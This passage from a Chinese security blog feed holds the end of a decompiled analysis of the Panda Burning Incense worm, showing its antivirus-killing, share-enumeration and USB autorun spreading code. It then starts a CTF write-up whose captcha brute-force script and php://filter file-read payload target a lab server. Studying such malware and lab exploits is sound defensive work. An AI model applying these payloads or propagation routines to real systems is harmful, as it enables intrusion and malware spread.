class="punctuation">]</span>);</span><br><span class="line">  return sub_403C68(&amp;loc_406BF8);</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>使用 FindWindowExA 枚举系统窗口</p><p>通过 GetWindowTextA 获取窗口标题</p><p>调用 sub_4041B4 检测窗口标题中的杀毒软件特征字符串</p><p>当检测到杀毒软件时，使用 PostMessageA 发送 WM_DESTROY （0x12）消息关闭窗口</p><p>这些个方法已经过时了</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">IceSword 是 <span class="number">2005</span>–<span class="number">2010</span> 年流行的内核工具，早就已经停止更新，现代 Windows（Win10/<span class="number">11</span>）根本无法运行</span><br><span class="line"></span><br><span class="line">行为特征库中早已收录：</span><br><span class="line">FindWindow + PostMessage(WM_CLOSE) + <span class="string">&quot;任务管理器&quot;</span></span><br><span class="line">keybd_event(VK_CONTROL) + VK_MENU + &#x27;D&#x27;</span><br><span class="line">高频调用 CreateToolhelp32Snapshot + RegSetValueEx</span><br><span class="line">云沙箱（如 ANY.RUN、Hybrid Analysis）会：</span><br><span class="line">模拟打开“任务管理器”窗口</span><br><span class="line">观察样本是否尝试关闭它</span><br><span class="line">→ 直接标记为恶意</span><br></pre></td></tr></table></figure><p>病毒内置了多种杀毒软件的特征字符串进行检测：</p><p>NOD32 Symantec Mcshield navapsvc VirusScan KAV (卡巴斯基)</p><p>键盘模拟对抗</p><p>使用 keybd_event 模拟键盘操作来干扰杀毒软件的正常运行</p><p>通过异常处理机制避免被杀毒软件检测到</p><p>接下来就可以操作文件感染（桌面全变成熊猫烧香图标），然后去进程注入</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">int *__usercall sub_4060D4@&lt;eax&gt;(int a1@&lt;eax&gt;)</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  int *p_n296; <span class="comment">// ebx</span></span><br><span class="line">  void *hObject; <span class="comment">// esi</span></span><br><span class="line">  bool i; <span class="comment">// al</span></span><br><span class="line">  char v4; <span class="comment">// zf</span></span><br><span class="line">  unsigned int v6<span class="punctuation">[</span><span class="number">10</span><span class="punctuation">]</span>; <span class="comment">// [esp-Ch] [ebp-154h] BYREF</span></span><br><span class="line">  int n296; <span class="comment">// [esp+1Ch] [ebp-12Ch] BYREF</span></span><br><span class="line">  _DWORD v8<span class="punctuation">[</span><span class="number">66</span><span class="punctuation">]</span>; <span class="comment">// [esp+40h] [ebp-108h] BYREF</span></span><br><span class="line">  int savedregs; <span class="comment">// [esp+148h] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  memset(&amp;v6<span class="punctuation">[</span><span class="number">5</span><span class="punctuation">]</span><span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">20</span>);</span><br><span class="line">  v8<span class="punctuation">[</span><span class="number">65</span><span class="punctuation">]</span> = a1;</span><br><span class="line">  sub_4040BC();</span><br><span class="line">  p_n296 = &amp;n296;</span><br><span class="line">  v6<span class="punctuation">[</span><span class="number">2</span><span class="punctuation">]</span> = (unsigned int)&amp;savedregs;</span><br><span class="line">  v6<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">]</span> = (unsigned int)&amp;loc_406206;</span><br><span class="line">  v6<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span> = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList;</span><br><span class="line">  __writefsdword(<span class="number">0</span><span class="punctuation">,</span> (unsigned int)v6);</span><br><span class="line">  hObject = (void *)sub_405028();</span><br><span class="line">  n296 = <span class="number">296</span>;</span><br><span class="line">  for ( i = sub_405048() != <span class="number">0</span>; i; i = sub_405068() != <span class="number">0</span> )</span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    sub_406028();</span><br><span class="line">    sub_405FA8();</span><br><span class="line">    sub_403EB4(<span class="number">260</span><span class="punctuation">,</span> v8);</span><br><span class="line">    sub_406028();</span><br><span class="line">    sub_405FA8();</span><br><span class="line">    sub_404018();</span><br><span class="line">    if ( v4 )</span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      p_n296 = (int *)sub_4060B4();</span><br><span class="line">      CloseHandle_0(hObject);</span><br><span class="line">      goto LABEL_7;</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line">  CloseHandle_0(hObject);</span><br><span class="line">  LOBYTE(p_n296) = <span class="number">1</span>;</span><br><span class="line">LABEL_7<span class="punctuation">:</span></span><br><span class="line">  __writefsdword(<span class="number">0</span><span class="punctuation">,</span> v6<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span>);</span><br><span class="line">  sub_403C68(&amp;loc_40620D);</span><br><span class="line">  sub_403C44();</span><br><span class="line">  return p_n296;</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h3 id="2-4-传播机制"><a href="#2-4-传播机制" class="headerlink" title="2.4 传播机制"></a>2.4 传播机制</h3><ul><li><p><strong>移动存储传播</strong>: 通过U盘、移动硬盘等设备传播</p></li><li><p><strong>网络共享传播</strong>: </p></li><li><p>访问 <code>admin$</code> 共享</p></li><li><p>使用 <code>NetShareEnum</code> 枚举网络共享</p></li><li><p>创建 <code>svcshare</code> 共享</p></li><li><p><strong>局域网传播</strong>: 扫描局域网内的其他计算机</p></li></ul><p>sub_40B768函数–负责网络传播</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">FARPROC sub_40B768()</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  HMODULE hModule;</span><br><span class="line">  FARPROC result;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 1. 加载 netapi32.dll（Windows 网络管理 API 库）</span></span><br><span class="line">  hModule = LoadLibraryA(<span class="string">&quot;netapi32.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2. 获取三个关键函数的地址：</span></span><br><span class="line">  NetShareEnum = (DWORD (__stdcall *)(...)) GetProcAddress(hModule<span class="punctuation">,</span> <span class="string">&quot;NetShareEnum&quot;</span>);</span><br><span class="line">  NetApiBufferFree = (DWORD (__stdcall *)(LPVOID)) GetProcAddress(hModule<span class="punctuation">,</span> <span class="string">&quot;NetApiBufferFree&quot;</span>);</span><br><span class="line">  result = GetProcAddress(hModule<span class="punctuation">,</span> <span class="string">&quot;NetShareEnum&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3. 保存函数地址到全局变量</span></span><br><span class="line">  dword_40E79C = (int)result;</span><br><span class="line">  return result;</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>加载网络API库 ，<strong>为后续的网络共享枚举准备</strong>。它动态加载 netapi32.dll 并获取 NetShareEnum 和 NetApiBufferFree 函数地址，这些函数用于枚举网络共享资源。病毒后续会利用这些函数来寻找局域网内的其他计算机，实现网络传播。</p><ul><li>通过 LoadLibraryA 加载 netapi32.dll 动态库</li><li>使用 GetProcAddress 获取 NetShareEnum 和 NetApiBufferFree 函数地址</li><li>利用 NetShareEnum 枚举网络中的共享资源</li><li>通过弱密码攻击获取访问权限，然后复制病毒文件</li></ul><p>TimerFunc函数：负责移动存储设备传播</p><p>大致流程如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sub_403F18(<span class="string">&quot;:\\setup.exe&quot;</span><span class="punctuation">,</span> v17);  <span class="comment">// 设置setup.exe路径</span></span><br><span class="line">sub_403F18(<span class="string">&quot;:\\autorun.inf&quot;</span><span class="punctuation">,</span> v16);  <span class="comment">// 设置autorun.inf路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建autorun.inf文件并写入自动运行配置</span></span><br><span class="line">sub_402AD8();</span><br><span class="line">*off_40D2BC = <span class="number">2</span>;  <span class="comment">// 文件写入模式</span></span><br><span class="line">sub_402874();  <span class="comment">// 可能是写入[AutoRun]部分</span></span><br><span class="line">sub_402614();  <span class="comment">// 写入命令</span></span><br><span class="line">sub_404260();  <span class="comment">// 可能写入OPEN=setup.exe</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1764490371417-95f5676d-c71a-4f3c-8433-8177c979e453.png" alt="img"></p><p>调用 sub_403F18 创建 setup.exe 和 autorun.inf 文件</p><p>使用 SetFileAttributesA 设置文件属性（隐藏、系统）</p><p>利用 CopyFileA 复制病毒文件到移动存储设备</p><p>通过 autorun.inf 配置自动运行项，实现设备插入自动执行</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">void __stdcall TimerFunc()</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  int v0; <span class="comment">// ebx</span></span><br><span class="line">  char v1; <span class="comment">// zf</span></span><br><span class="line">  const CHAR *lpFileName; <span class="comment">// esi</span></span><br><span class="line">  const CHAR *lpExistingFileName; <span class="comment">// eax</span></span><br><span class="line">  const CHAR *lpExistingFileName_1; <span class="comment">// eax</span></span><br><span class="line">  const CHAR *lpFileName_1; <span class="comment">// esi</span></span><br><span class="line">  HANDLE hObject; <span class="comment">// eax</span></span><br><span class="line">  const CHAR *lpFileName_2; <span class="comment">// eax</span></span><br><span class="line">  HANDLE hObject_1; <span class="comment">// eax</span></span><br><span class="line">  const CHAR *lpFileName_3; <span class="comment">// eax</span></span><br><span class="line">  const CHAR *lpFileName_4; <span class="comment">// eax</span></span><br><span class="line">  const CHAR *lpNewFileName; <span class="comment">// [esp-20h] [ebp-248h]</span></span><br><span class="line">  const CHAR *lpNewFileName_1; <span class="comment">// [esp-20h] [ebp-248h]</span></span><br><span class="line">  unsigned int v13<span class="punctuation">[</span><span class="number">3</span><span class="punctuation">]</span>; <span class="comment">// [esp-18h] [ebp-240h] BYREF</span></span><br><span class="line">  unsigned int v14<span class="punctuation">[</span><span class="number">2</span><span class="punctuation">]</span>; <span class="comment">// [esp-Ch] [ebp-234h] BYREF</span></span><br><span class="line">  int *v15; <span class="comment">// [esp-4h] [ebp-22Ch]</span></span><br><span class="line">  int v16; <span class="comment">// [esp+24h] [ebp-204h]</span></span><br><span class="line">  int v17; <span class="comment">// [esp+28h] [ebp-200h]</span></span><br><span class="line">  int v18; <span class="comment">// [esp+34h] [ebp-1F4h]</span></span><br><span class="line">  int v19; <span class="comment">// [esp+40h] [ebp-1E8h]</span></span><br><span class="line">  int v20; <span class="comment">// [esp+224h] [ebp-4h]</span></span><br><span class="line">  int savedregs; <span class="comment">// [esp+228h] [ebp+0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v15 = &amp;savedregs;</span><br><span class="line">  v14<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">]</span> = (unsigned int)&amp;loc_40C016;</span><br><span class="line">  v14<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span> = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList;</span><br><span class="line">  __writefsdword(<span class="number">0</span><span class="punctuation">,</span> (unsigned int)v14);</span><br><span class="line">  v13<span class="punctuation">[</span><span class="number">2</span><span class="punctuation">]</span> = (unsigned int)&amp;savedregs;</span><br><span class="line">  v13<span class="punctuation">[</span><span class="number">1</span><span class="punctuation">]</span> = (unsigned int)&amp;loc_40BFE1;</span><br><span class="line">  v13<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span> = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList;</span><br><span class="line">  __writefsdword(<span class="number">0</span><span class="punctuation">,</span> (unsigned int)v13);</span><br><span class="line">  sub_403C44();</span><br><span class="line">  sub_403C44();</span><br><span class="line">  sub_403C44();</span><br><span class="line">  sub_40B9D8();</span><br><span class="line">  if ( v20 )</span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    v0 = sub_403ECC();</span><br><span class="line">    if ( v0 &gt;= <span class="number">1</span> )</span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      do</span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        sub_403E2C();</span><br><span class="line">        ((void (*)(void))sub_40B9A4)();</span><br><span class="line">        sub_40B9A4(v19);</span><br><span class="line">        if ( !sub_4041B4() )</span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          sub_403E2C();</span><br><span class="line">          sub_40B9A4(v13<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span>);</span><br><span class="line">          sub_40B9A4(v18);</span><br><span class="line">          if ( !sub_4041B4() )</span><br><span class="line">          <span class="punctuation">&#123;</span></span><br><span class="line">            sub_403E2C();</span><br><span class="line">            sub_403F18(<span class="string">&quot;:\\setup.exe&quot;</span><span class="punctuation">,</span> v17);</span><br><span class="line">            sub_403E2C();</span><br><span class="line">            sub_403F18(<span class="string">&quot;:\\autorun.inf&quot;</span><span class="punctuation">,</span> v16);</span><br><span class="line">            if ( (unsigned __int8)sub_40B994() )</span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">              sub_40277C();</span><br><span class="line">              sub_40BA84();</span><br><span class="line">              sub_40BA84();</span><br><span class="line">              sub_404018();</span><br><span class="line">              if ( !v1 )</span><br><span class="line">              <span class="punctuation">&#123;</span></span><br><span class="line">                lpFileName = (const CHAR *)sub_4040CC();</span><br><span class="line">                SetFileAttributesA(lpFileName<span class="punctuation">,</span> <span class="number">0x80</span>u);</span><br><span class="line">                if ( !DeleteFileA(lpFileName) )</span><br><span class="line">                  break;</span><br><span class="line">                sub_403E2C();</span><br><span class="line">                sub_403ED4();</span><br><span class="line">                lpNewFileName = (const CHAR *)sub_4040CC();</span><br><span class="line">                sub_40277C();</span><br><span class="line">                lpExistingFileName = (const CHAR *)sub_4040CC();</span><br><span class="line">                if ( !CopyFileA(lpExistingFileName<span class="punctuation">,</span> lpNewFileName<span class="punctuation">,</span> <span class="number">0</span>) )</span><br><span class="line">                  break;</span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">            else</span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">              sub_403E2C();</span><br><span class="line">              sub_403ED4();</span><br><span class="line">              lpNewFileName_1 = (const CHAR *)sub_4040CC();</span><br><span class="line">              sub_40277C();</span><br><span class="line">              lpExistingFileName_1 = (const CHAR *)sub_4040CC();</span><br><span class="line">              if ( !CopyFileA(lpExistingFileName_1<span class="punctuation">,</span> lpNewFileName_1<span class="punctuation">,</span> <span class="number">0</span>) )</span><br><span class="line">                break;</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">            if ( (unsigned __int8)sub_40B994() )</span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">              sub_40BA84();</span><br><span class="line">              sub_404018();</span><br><span class="line">              if ( !v1 )</span><br><span class="line">              <span class="punctuation">&#123;</span></span><br><span class="line">                lpFileName_1 = (const CHAR *)sub_4040CC();</span><br><span class="line">                SetFileAttributesA(lpFileName_1<span class="punctuation">,</span> <span class="number">0x80</span>u);</span><br><span class="line">                if ( !DeleteFileA(lpFileName_1) )</span><br><span class="line">                  break;</span><br><span class="line">                hObject = CreateFileA_0(lpFileName_1<span class="punctuation">,</span> <span class="number">0x40000000</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">2</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">                CloseHandle_0(hObject);</span><br><span class="line">                sub_402AD8();</span><br><span class="line">                *off_40D2BC = <span class="number">2</span>;</span><br><span class="line">                sub_402874();</span><br><span class="line">                sub_402614();</span><br><span class="line">                sub_404260();</span><br><span class="line">                sub_402B88();</span><br><span class="line">                sub_402614();</span><br><span class="line">                sub_402C48();</span><br><span class="line">                sub_402614();</span><br><span class="line">              <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">            else</span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">              lpFileName_2 = (const CHAR *)sub_4040CC();</span><br><span class="line">              hObject_1 = CreateFileA_0(lpFileName_2<span class="punctuation">,</span> <span class="number">0x40000000</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">2</span>u<span class="punctuation">,</span> <span class="number">0</span><span class="punctuation">,</span> <span class="number">0</span>);</span><br><span class="line">              CloseHandle_0(hObject_1);</span><br><span class="line">              sub_402AD8();</span><br><span class="line">              *off_40D2BC = <span class="number">2</span>;</span><br><span class="line">              sub_402874();</span><br><span class="line">              sub_402614();</span><br><span class="line">              sub_404260();</span><br><span class="line">              sub_402B88();</span><br><span class="line">              sub_402614();</span><br><span class="line">              sub_402C48();</span><br><span class="line">              sub_402614();</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">            sub_403E2C();</span><br><span class="line">            sub_403ED4();</span><br><span class="line">            lpFileName_3 = (const CHAR *)sub_4040CC();</span><br><span class="line">            SetFileAttributesA(lpFileName_3<span class="punctuation">,</span> <span class="number">7</span>u);</span><br><span class="line">            lpFileName_4 = (const CHAR *)sub_4040CC();</span><br><span class="line">            SetFileAttributesA(lpFileName_4<span class="punctuation">,</span> <span class="number">7</span>u);</span><br><span class="line">          <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">        --v0;</span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">      while ( v0 );</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line">  __writefsdword(<span class="number">0</span><span class="punctuation">,</span> v13<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span>);</span><br><span class="line">  __writefsdword(<span class="number">0</span><span class="punctuation">,</span> v14<span class="punctuation">[</span><span class="number">0</span><span class="punctuation">]</span>);</span><br><span class="line">  sub_403C68(&amp;loc_40C01D);</span><br><span class="line">  sub_403C68(v15);</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>像什么u盘，手机，一插到电脑就会继续传播</p><p>这个或许就是当年为什么传播范围这么广的原因(○´･д･)ﾉ</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;传统病毒分析-熊猫烧香2.0&lt;/p&gt;</summary>
    
    
    
    <category term="病毒分析" scheme="https://flypigc.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    
    <category term="病毒分析" scheme="https://flypigc.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2019 总决赛 Day1 Web1--滑稽云音乐</title>
    <link href="https://flypigc.github.io/2025/12/11/CISCN2019%20%E6%80%BB%E5%86%B3%E8%B5%9B%20Day1%20Web1--%E6%BB%91%E7%A8%BD%E4%BA%91%E9%9F%B3%E4%B9%90/"/>
    <id>https://flypigc.github.io/2025/12/11/CISCN2019%20%E6%80%BB%E5%86%B3%E8%B5%9B%20Day1%20Web1--%E6%BB%91%E7%A8%BD%E4%BA%91%E9%9F%B3%E4%B9%90/</id>
    <published>2025-12-11T07:44:40.926Z</published>
    <updated>2025-12-20T01:52:33.143Z</updated>
    
    <content type="html"><![CDATA[<p>webpwn</p><span id="more"></span><p>打开环境，F12就看到提示了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431640825-f6e85e63-b19e-4ca9-9d09-bf675ad95c72.jpg" alt="null"><br>大概就是firmware有个关键点、<br>需要管理员<br>这里我们不知道密码<br>所以先尝试注册一个登录进去</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431640962-e0ee05d1-03bc-4e26-83b9-6990e1faf03d.jpg" alt="null"></p><p>注册这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(code+&quot;MWQIRZQf&quot;)[:5]==&quot;e4e62&quot;</span><br></pre></td></tr></table></figure><p>大概就是验证码逻辑<br>写个脚本去爆</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">  </span><br><span class="line">def find_code():  </span><br><span class="line">   target_prefix = &quot;e4e62&quot;  </span><br><span class="line">   suffix = &quot;MWQIRZQf&quot;  </span><br><span class="line">   for i in range(1000000):  # 假设 code 是一个整数，可以调整范围  </span><br><span class="line">       code = str(i)  </span><br><span class="line">       combined = code + suffix  </span><br><span class="line">       hash_value = hashlib.md5(combined.encode()).hexdigest()  </span><br><span class="line">       if hash_value[:5] == target_prefix:  </span><br><span class="line">           return code  </span><br><span class="line">  </span><br><span class="line">code = find_code()  </span><br><span class="line">print(&quot;Found code:&quot;, code)</span><br></pre></td></tr></table></figure><p>注册成功，登陆进去</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765431641033-897936b1-8c58-45df-8115-7f9b0cdd5cbb.jpg" alt="null"></p><p>这里bota替换掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPXNoYXJlLnBocA==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php://filter/read=convert.base64-encode/resource=share.php</span><br></pre></td></tr></table></figure><p>然后去curl源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\11759&gt;curl -v &quot;http://f979b55d-35c1-4204-b41f-b188bb4f45c2.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPXNoYXJlLnBocA==&quot;</span><br><span class="line">#share.php</span><br><span class="line">&lt;?php</span><br><span class="line"># For sharing files in /media directory, do not delete, you can modify</span><br><span class="line"># 分享功能，用来分享/media文件夹下的文件。不可删除，可以按需修改。</span><br><span class="line">ini_set(&#x27;display_errors&#x27;,&#x27;Off&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">header(&#x27;Content-Type: application/octet-stream&#x27;);</span><br><span class="line">$filepath=base64_decode($_SERVER[&#x27;QUERY_STRING&#x27;]);</span><br><span class="line">if (strlen($filepath)&lt;=0) exit();</span><br><span class="line">$file=fopen($filepath,&quot;rb&quot;);</span><br><span class="line">if ($file==FALSE) exit();</span><br><span class="line">ob_clean();</span><br><span class="line">while(!feof($file))</span><br><span class="line">&#123;</span><br><span class="line">    print(fread($file,1024*8));</span><br><span class="line">    ob_flush();</span><br><span class="line">    flush();</span><br><span class="line">&#125;</span><br><span class="line">curl -v &quot;http://f979b55d-35c1-4204-b41f-b188bb4f45c2.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2hvdGxvYWQucGhw&quot;</span><br><span class="line"></span><br><span class="line">php://filter/read=convert.base64-encode/resource=../hotload.php</span><br><span class="line">#hotload.php</span><br><span class="line">&lt;?php</span><br><span class="line">include_once &#x27;include/config.php&#x27;;</span><br><span class="line"></span><br><span class="line">@$page=$_GET[&#x27;page&#x27;];</span><br><span class="line">if (isset($page)) $page=(string) $page;</span><br><span class="line">if (!isset($page)||strlen($page)&lt;=0) $page=&#x27;index&#x27;;</span><br><span 